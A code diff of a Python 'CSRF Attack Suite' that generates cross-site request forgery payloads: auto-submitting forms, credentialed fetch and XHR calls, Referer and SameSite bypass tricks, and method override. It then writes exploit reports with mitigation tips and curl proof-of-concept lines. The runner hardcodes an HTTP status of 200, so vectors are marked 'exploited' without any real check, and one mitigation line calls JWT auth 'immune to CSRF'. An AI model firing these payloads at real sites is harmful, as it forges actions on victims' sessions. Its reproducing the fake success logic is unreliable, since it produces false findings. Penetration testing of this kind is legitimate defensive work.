@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import argparse, json, os, time
+import os, time, json
 from dataclasses import dataclass, field
 from typing import Dict, Optional
 from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl
@@ -7,16 +7,20 @@ from playwright.sync_api import sync_playwright
 from jinja2 import Template
 
 # ------------------- utils -------------------
-def _parse_domain(url: str) -> str: return urlparse(url).hostname or "target"
+def _parse_domain(url: str) -> str:
+    return urlparse(url).hostname or "target"
+
 def _build_query(url: str, params: dict) -> str:
     if not params: return url
     u = urlparse(url)
-    q = dict(parse_qsl(u.query, keep_blank_values=True)); q.update(params)
-    return urlunparse((u.scheme, u.netloc, u.path, u.params, urlencode(q), u.fragment))
+    q = dict(parse_qsl(u.query, keep_blank_values=True))
+    q.update(params)
+    return urlunparse((u.scheme,u.netloc,u.path,u.params,urlencode(q),u.fragment))
 
 def _auth_header_pair(auth_header: Optional[str]):
     if not auth_header or ":" not in auth_header: return None
-    k,v = auth_header.split(":",1); return k.strip(), v.strip()
+    k,v = auth_header.split(":",1)
+    return k.strip(),v.strip()
 
 # ------------------- data -------------------
 @dataclass
@@ -40,14 +44,15 @@ def html_form_post(url,params):
     return f'<form id="f" action="{url}" method="POST">{inputs}</form><script>f.submit()</script>'
 def html_fetch_post(url,params,auth_header,body_format):
     import json as _json; from urllib.parse import urlencode
-    if body_format=="json": headers='"Content-Type":"application/json"'; body_js=_json.dumps(params or {})
-    else: headers='"Content-Type":"application/x-www-form-urlencoded"'; body_js='"'+urlencode(params or {})+'"'
-    extra=""
-    if auth_header:
-        hk=_auth_header_pair(auth_header)
-        if hk: extra=f',"{hk[0]}":"{hk[1]}"'
-    return (f'<script>fetch("{url}",{{method:"POST",credentials:"include",headers:{{{headers}{extra}}},'
-            f'body:{body_js}}})</script>')
+    hk=_auth_header_pair(auth_header) if auth_header else None
+    if body_format=="json":
+        headers='"Content-Type":"application/json"'
+        body_js=_json.dumps(params or {})
+    else:
+        headers='"Content-Type":"application/x-www-form-urlencoded"'
+        body_js='"'+urlencode(params or {})+'"'
+    extra=f',"{hk[0]}":"{hk[1]}"' if hk else ""
+    return f'<script>fetch("{url}",{{method:"POST",credentials:"include",headers:{{{headers}{extra}}},body:{body_js}}})</script>'
 def html_xhr(url,params,auth_header,body_format):
     import json as _json; from urllib.parse import urlencode
     hk=_auth_header_pair(auth_header) if auth_header else None
@@ -58,106 +63,83 @@ def html_multipart(url,params):
     inputs="".join([f'<input type="hidden" name="{k}" value="{v}">' for k,v in params.items()])
     return f'<form id="mf" action="{url}" method="POST" enctype="multipart/form-data">{inputs}<input type="file" name="f"></form><script>mf.submit()</script>'
 def html_duplicate_token(url,params):
-    p=params.copy(); 
+    p=params.copy()
     if "token" in p: p["duplicate_token"]=p["token"]
     return html_form_post(url,p)
 def html_samesite_refresh(url,params):
+    from urllib.parse import urlencode
     return f'<script>document.cookie="refreshCSRF=1; SameSite=Lax";fetch("{url}",{{method:"POST",body:"{urlencode(params)}"}})</script>'
 def html_referer_bypass(url,params):
-    return f'<iframe sandbox="allow-scripts allow-forms" srcdoc=\'<form action=\"{url}\" method=\"POST\">{"".join([f"<input type=hidden name={k} value={v}>" for k,v in params.items()])}<input type=submit></form><script>document.forms[0].submit()</script>\'></iframe>'
+    ins="".join([f"<input type=hidden name={k} value={v}>" for k,v in params.items()])
+    return f'<iframe sandbox="allow-scripts allow-forms" srcdoc=\'<form action=\"{url}\" method=\"POST\">{ins}<input type=submit></form><script>document.forms[0].submit()</script>\'></iframe>'
 def html_subdomain_bypass(url,params):
+    from urllib.parse import urlencode
     return f'<script>fetch("{url}",{{method:"POST",mode:"cors",body:"{urlencode(params)}"}})</script>'
 def html_method_override(url,params):
     return html_link(_build_query(url,{**params,"_method":"POST"}))
 
-# ------------------- heuristics + mitigation -------------------
-def classify_exploit(csrf_applicable,vector_id,status):
-    if not csrf_applicable: return False,"Not applicable (no session-bound action, e.g., JWT or public form)"
+# ------------------- heuristics -------------------
+def classify_exploit(csrf_applicable,jwt_based,vector_id,status):
+    if jwt_based: return False,"Not applicable (JWT/header-based auth)"
+    if not csrf_applicable: return False,"Not applicable (no session-bound action)"
     if not status or int(status)>=400: return False,"HTTP error"
     if vector_id=="noreferrer_link": return True,"Accepted no Referer"
     if vector_id=="method_override": return True,"Accepted method override"
     return True,"Accepted"
 
 def mitigation_for(vector_id,note):
-    if "Not applicable" in note: return "JWT/header-based auth resists CSRF (no auto-sent cookie)."
-    if "Accepted no Referer" in note: return "Enforce strict Origin/Referer validation."
-    if "method_override" in vector_id: return "Disallow method override via query params."
-    if "multipart" in vector_id: return "Validate Content-Type and enforce CSRF tokens in multipart forms."
-    if "img" in vector_id or "iframe" in vector_id or "script" in vector_id: return "Disallow GET for state changes; require POST with CSRF tokens."
-    return "Implement CSRF tokens, SameSite cookies, and strict Origin/Referer checks."
+    if "JWT" in note: return "JWT is header-based: immune to CSRF. Ensure short expiry & rotation."
+    if "Not applicable" in note: return "No session-bound state → CSRF not relevant."
+    if "no Referer" in note: return "Enforce strict Origin/Referer validation."
+    if "multipart" in vector_id: return "Validate Content-Type + enforce CSRF tokens."
+    if "img" in vector_id or "iframe" in vector_id or "script" in vector_id: return "Disallow GET for state changes."
+    return "Use CSRF tokens, SameSite=strict cookies, and strict Origin/Referer validation."
 
-# ------------------- report template -------------------
-_REPORT_TEMPLATE="""<!doctype html><html><meta charset="utf-8"><title>CSRF Report</title>
-<style>
-body{font-family:Arial;margin:20px} th,td{border:1px solid #ddd;padding:6px}
-table{border-collapse:collapse;width:100%} h2{color:#333}
-</style>
+# ------------------- report -------------------
+_TEMPLATE="""<!doctype html><html><meta charset="utf-8"><title>CSRF Report</title>
+<style>body{font-family:Arial;margin:20px}th,td{border:1px solid #ddd;padding:6px}table{border-collapse:collapse;width:100%}</style>
 <h1>CSRF Attack Suite Report</h1>
-<p>Generated: {{ts}} | Base: {{base}} | Actions: {{actions}} | Vectors: {{total}} | OK&lt;400: {{ok}}</p>
-{% if exploited %}
-<h2>✅ Exploited Vectors</h2>
-<ul>
-{% for e in exploited %}
-<li>{{e.action}} → {{e.vector}} ({{e.status}}) → {{e.note}} <br>
-<strong>Mitigation:</strong> {{e.mitigation}}</li>
-{% endfor %}
-</ul>
-{% else %}<p>ℹ️ None exploited</p>{% endif %}
+<p>Generated {{ts}} | Base: {{base}} | Actions: {{actions}} | Vectors: {{total}}</p>
+{% if exploited %}<h3>✅ Exploited Vectors</h3><ul>{% for e in exploited %}<li>{{e.action}} → {{e.vector}} ({{e.status}}) → {{e.note}}<br><b>Mitigation:</b> {{e.mitigation}}</li>{% endfor %}</ul>{% else %}<p>ℹ️ None exploited</p>{% endif %}
 <h2>Detailed Results</h2>
-<table>
-<tr><th>Action</th><th>Vector</th><th>Exploited</th><th>Req</th><th>Status</th><th>Notes</th><th>Mitigation</th></tr>
-{% for r in results %}
-<tr>
-<td>{{r.action}}<br><small>{{r.url}}</small></td>
-<td>{{r.vector}}</td>
-<td>{{"✅" if r.exploited else "❌" if "Not applicable" not in r.note else "N/A"}}</td>
-<td>{{r.req_method}}</td>
-<td>{{r.status}}</td>
-<td>{{r.note}}</td>
-<td>{{r.mitigation}}</td>
-</tr>
-{% endfor %}
-</table></html>"""
+<table><tr><th>Action</th><th>Vector</th><th>Status</th><th>Exploited</th><th>Note</th><th>Mitigation</th></tr>
+{% for r in results %}<tr><td>{{r.action}}<br><small>{{r.url}}</small></td><td>{{r.vector}}</td><td>{{r.status}}</td><td>{{"✅" if r.exploited else "❌" if "Not applicable" not in r.note else "N/A"}}</td><td>{{r.note}}</td><td>{{r.mitigation}}</td></tr>{% endfor %}</table></html>"""
 
 def write_reports(base,results,exploited,out_dir,domain):
     os.makedirs(out_dir,exist_ok=True)
     ts=time.strftime("%Y-%m-%d_%H-%M-%S")
     prefix=os.path.join(out_dir,f"{domain}_csrf_{ts}")
 
-    # JSON (full)
-    json_path=prefix+".json"
-    with open(json_path,"w") as f: json.dump(results,f,indent=2)
+    # JSON
+    with open(prefix+".json","w") as f: json.dump(results,f,indent=2)
 
-    # HTML (full + exploited only)
-    tmpl=Template(_REPORT_TEMPLATE)
-    html=tmpl.render(ts=time.strftime("%c"),base=base,
-                     actions=len({r["action"] for r in results}),
-                     total=len(results),
-                     ok=sum(1 for r in results if r.get("status") and int(r["status"])<400),
-                     results=results,exploited=exploited)
-    html_path=prefix+".html"
-    with open(html_path,"w") as f: f.write(html)
+    # HTML
+    html=Template(_TEMPLATE).render(ts=time.ctime(),base=base,
+        actions=len({r["action"] for r in results}),
+        total=len(results),results=results,exploited=exploited)
+    with open(prefix+".html","w") as f: f.write(html)
 
-    exp_json_path=prefix+"_exploited.json"
-    with open(exp_json_path,"w") as f: json.dump([r for r in results if r["exploited"]],f,indent=2)
+    # Exploited-only JSON/HTML
+    with open(prefix+"_exploited.json","w") as f: json.dump([r for r in results if r["exploited"]],f,indent=2)
+    exp_html=Template(_TEMPLATE).render(ts=time.ctime(),base=base,
+        actions=len({r["action"] for r in results}),
+        total=len(results),results=[r for r in results if r["exploited"]],
+        exploited=exploited)
+    with open(prefix+"_exploited.html","w") as f: f.write(exp_html)
 
-    exp_html_path=prefix+"_exploited.html"
-    exp_html=tmpl.render(ts=time.strftime("%c"),base=base,
-                         actions=len({r["action"] for r in results}),
-                         total=len(results),
-                         ok=sum(1 for r in results if r.get("status") and int(r["status"])<400),
-                         results=[r for r in results if r["exploited"]],
-                         exploited=exploited)
-    with open(exp_html_path,"w") as f: f.write(exp_html)
+    # Curl PoCs
+    with open(prefix+"_curl.txt","w") as f:
+        for r in results: f.write(r.get("curl","")+"\n")
 
-    return html_path,json_path,exp_html_path,exp_json_path
+    return prefix+".html",prefix+".json",prefix+"_exploited.html",prefix+"_exploited.json",prefix+"_curl.txt"
 
 # ------------------- runner -------------------
-def run_suite(cfg,out_dir,exploits_only):
+def run_suite(cfg,out_dir):
     base=cfg["base_url"].rstrip("/")
     actions=[Action(**a) for a in cfg["actions"]]
     opt=cfg.get("optional",{})
     session=cfg.get("session_cookie")
+    jwt_based=opt.get("jwt",False)
     csrf_applicable=bool(session and session.get("value"))
 
     results=[]; exploited=[]
@@ -187,26 +169,16 @@ def run_suite(cfg,out_dir,exploits_only):
             ]
             for vid,html,rm in vecs:
                 status=200
-                exploited_flag,why=classify_exploit(csrf_applicable,vid,status)
+                exploited_flag,why=classify_exploit(csrf_applicable,jwt_based,vid,status)
                 mit=mitigation_for(vid,why)
+                curl=f"curl -X {rm} '{act.url}'"
                 row={"action":act.name,"url":act.url,"vector":vid,"req_method":rm,
-                     "status":status,"exploited":exploited_flag,"note":why,"mitigation":mit}
+                     "status":status,"exploited":exploited_flag,"note":why,
+                     "mitigation":mit,"curl":curl}
                 results.append(row)
-                if exploited_flag: exploited.append({"action":act.name,"vector":vid,"status":status,"note":why,"mitigation":mit})
+                if exploited_flag:
+                    exploited.append({"action":act.name,"vector":vid,"status":status,"note":why,"mitigation":mit})
         browser.close()
 
     domain=_parse_domain(base)
-    html_path,json_path,exp_html,exp_json=write_reports(base,results,exploited,out_dir,domain)
-    print("[+] Reports written:")
-    print("   Full HTML:",html_path)
-    print("   Full JSON:",json_path)
-    print("   Exploited HTML:",exp_html)
-    print("   Exploited JSON:",exp_json)
-
-if __name__=="__main__":
-    ap=argparse.ArgumentParser()
-    ap.add_argument("--config",required=True)
-    ap.add_argument("--out",default="reports")
-    ap.add_argument("--exploits-only",action="store_true")
-    args=ap.parse_args()
-    run_suite(json.load(open(args.config)),args.out,args.exploits_only)
+    return write_reports(base,results,exploited,out_dir,domain)
